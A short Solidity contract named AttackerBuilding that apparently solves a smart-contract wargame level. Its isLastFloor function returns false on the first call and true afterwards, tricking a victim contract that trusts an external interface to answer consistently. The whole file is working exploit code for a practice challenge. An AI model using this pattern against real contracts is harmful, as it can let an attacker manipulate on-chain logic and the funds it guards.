pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract AttackerBuilding is Building {
    uint private callCount;

    function isLastFloor(uint256 _floor) external returns (bool) {
        callCount++;
        if (callCount == 1) {
            return false;
        } else {
            return true;
        }
    }
}  